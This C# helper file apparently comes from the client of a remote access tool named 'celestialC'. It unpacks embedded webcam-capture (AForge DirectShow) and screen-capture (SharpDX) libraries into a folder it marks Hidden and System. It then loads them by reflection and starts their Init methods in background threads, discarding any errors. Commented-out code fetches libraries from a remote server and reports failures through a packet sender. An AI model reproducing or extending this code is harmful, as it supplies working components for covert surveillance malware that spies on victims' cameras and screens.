using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace celestialC.Helper
{
    internal sealed class Libs
    {
        public static string ZipLib = "DotNetZip.dll"; // сервера с либами больше нет. (вставлять прямые ссылки на либы)
        public static string AForgeDirectShow = "AForge.Video.DirectShow.dll";
        public static string AForgeVideo = "AForge.Video.dll";
        public static string SharpDX = "SharpDX.dll";
        public static string SharpDXD3D9 = "SharpDX.Direct3D9.dll";
        public static string SharpDXD3D11 = "SharpDX.Direct3D11.dll";
        public static string SharpDXGI = "SharpDX.DXGI.dll";
        public static string getAppPath()
        {
              if (Settings.LibFolder == "Same")
              {
                  string assemblyPath = Assembly.GetExecutingAssembly().Location;
                  return Path.GetDirectoryName(assemblyPath);
              }else if(Settings.LibFolder.StartsWith("%"))
              {
                string env = Environment.ExpandEnvironmentVariables(Settings.LibFolder) + "\\";
                return Path.Combine(env, Settings.LibSubFolder);
              }
              else
              {
                  string assemblyPath = Assembly.GetExecutingAssembly().Location;
                  return Path.GetDirectoryName(assemblyPath);
              }
        }
        public static bool LoadRemoteLibrary(string library)
        {
            if (!Directory.Exists(getAppPath()))
            {
                Directory.CreateDirectory(getAppPath());
                InitLibs();
            }
            var di = new DirectoryInfo(getAppPath());
            di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            string dll = Path.Combine(getAppPath(), library);
            if (!File.Exists(dll))
            {
                InitLibs();
                // try
                // {
                //    using (var client = new WebClient())
                //         client.DownloadFile(library, dll);
                // }
                // catch (WebException)
                // {
                //     List<byte> ToSendL = new List<byte>();
                //     ToSendL.Add(21);
                //     ToSendL.AddRange(Encoding.UTF8.GetBytes("Cannot download library (" + Path.GetFileName(new Uri(library).LocalPath) + ")"));
                //     PacketSender.Send(ToSendL.ToArray());
                //     return false;
                // }
                //File.SetAttributes(dll, FileAttributes.Hidden | FileAttributes.System);
            }
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);
            return File.Exists(dll) && new FileInfo(dll).Length != 0;
        }
        
        public static void InitLibs()
        {
            var random = new Random();
            
            var path = getAppPath();
            var zipPath = Path.Combine(path, random.Next(1000, 10000) + ".zip");
            var zipBytes = GetLibsBytes();

            if (zipBytes != null)
            {
                File.WriteAllBytes(zipPath, zipBytes);
                ZipFile.ExtractToDirectory(zipPath, path);
                
                if (File.Exists(Path.Combine(path, ZipLib)))
                    LoadStaticLibrary(Path.Combine(path, ZipLib));
                
                if (File.Exists(Path.Combine(path, AForgeDirectShow)))
                    LoadStaticLibrary(Path.Combine(path, AForgeDirectShow));
                
                if (File.Exists(Path.Combine(path, AForgeVideo)))
                    LoadStaticLibrary(Path.Combine(path, AForgeVideo));
                
                if (File.Exists(Path.Combine(path, SharpDX)))
                    LoadStaticLibrary(Path.Combine(path, SharpDX));
                
                if (File.Exists(Path.Combine(path, SharpDXD3D9)))
                    LoadStaticLibrary(Path.Combine(path, SharpDXD3D9));
                
                if (File.Exists(Path.Combine(path, SharpDXD3D11)))
                    LoadStaticLibrary(Path.Combine(path, SharpDXD3D11));
                
                if (File.Exists(Path.Combine(path, SharpDXGI)))
                    LoadStaticLibrary(Path.Combine(path, SharpDXGI));
            }
        }
        
        private static byte[] GetLibsBytes()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourceNames = assembly.GetManifestResourceNames();

            foreach (var resourceName in resourceNames)
            {
                if (resourceName.EndsWith("libs.zip"))
                {
                    using (var stream = assembly.GetManifestResourceStream(resourceName))
                    {
                        if (stream != null)
                        {
                            using (var ms = new MemoryStream())
                            {
                                stream.CopyTo(ms);
                                var zipBytes = ms.ToArray();

                                return zipBytes;
                            }
                        }
                    }
                }
            }

            return null;
        }

        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            string s = getAppPath() + "\\" + args.Name.Remove(args.Name.IndexOf(',')) + ".dll";
            return Assembly.LoadFile(s);
        }

        private static void LoadStaticLibrary(string libraryPath)
        {
            try
            {
                Assembly assembly = Assembly.LoadFrom(Path.Combine(getAppPath(), libraryPath));
                Type type = null;
                foreach (var t in assembly.GetTypes())
                {
                    if (t.Name != "CelestialLoader") continue;
                    type = t;
                    break;
                }
                var method = type.GetMethod("Init");
                var thread = new Thread(() => method.Invoke(null, new object[] { }));
                thread.Start();
            }
            catch
            {
            }
        } 
    }
}
